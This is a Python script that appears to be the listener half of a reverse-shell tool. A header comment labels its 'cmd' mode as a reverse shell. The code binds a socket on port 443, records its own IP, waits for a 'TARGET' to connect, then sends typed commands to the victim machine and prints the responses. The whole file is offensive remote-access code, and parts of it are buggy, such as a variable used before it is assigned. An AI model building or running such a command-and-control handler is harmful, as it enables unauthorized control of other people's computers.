# COMMAND LIST:
# viewcwd- show all files in directory where file is running
# cmd - reverse shell
#
#
#
#
#
#
#
#
import socket
import sys
import time
import os
import subprocess


class welcomenavi:
    welcome1 = "Welcome!!!"

    def __init__(self, welcome1):
        self.welcome = welcome1


class ipFiles:

    def __init__(self):
        pass


    @staticmethod
    def ip():
        global IP

        sip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # doesn't even have to be reachable
            sip.connect(('10.255.255.255', 1))
            IP = sip.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            sip.close()
            return IP
    def files():
        with open("Hosts", 'a', encoding='utf-8') as H:
                H.write('%s\n' % IP)




class cons:
    def __init__(self, ip, port, clients):
        self.port = port
        self.ip = ipFiles.ip()
        self.clients = clients
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    @staticmethod
    def nport():
        return input('Enter the new port: ')

    @staticmethod
    def nhost():
        return input('Enter the new host')

    def socket_create(self):
        print("----------------------------Creating Socket-----------------------------")
        try:
            self.s
        except socket.error as msg:
            print("socket creation error: " + str(msg))
    def socket_bind(self):
        print("--------------------------Binding Socket----------------------------------")
        try:
            print("BINDING SOCKET TO PORT: " + str(self.port))
            self.s.bind((ipFiles.ip(), self.port))
            print("Binded")
            self.s.listen(5)
        except socket.error as msg:
            print("socket binding error: " + str(msg) + "\n" + "Retrying....")

    def joined(self):
        global conn
        global address
        conn, address = self.s.accept()
        print("--------------TARGET JOINED THE SERVER---------------------------")
        print("IP " + address[0] + "|PORT " + str(address[1]))



    def command(self):
        while True:
            command = input(str("command>> "))
            conn.send(command.encode())
            if command == "cmd":
                cons.CMD(self)
            else:
                print("Command not recognised")
    def exe(self):
        while True:
            files = conn.recv(1)
            files = files.decode("utf-8")
            print(files)

    def filsize(self):
        bits = (conn.recv(10000))
        filesize = len(bits)
        num = filesize / 240
        times = num + 1
        return times


    def CMD(self):
        global full_msg
        while True:
            cmd = str(input(""))
            conn.send(cmd.encode())
            time=0
            while cons.filsize(self) != time:
                time = time+1
                client_response = (str(conn.recv(240), "utf-8"))
                full_msg = client_response+full_msg

                if cons.filsize(self) == time:
                    print(full_msg)





#if cmd == "quit":
#conn.close()
#self.s.close()
#sys.exit










con = cons(ipFiles.ip, 443, 0)
print(welcomenavi.welcome1)
print(ipFiles.ip())
ipFiles.files()
cons.socket_create(con)
cons.socket_bind(con)
cons.joined(con)
cons.command(con)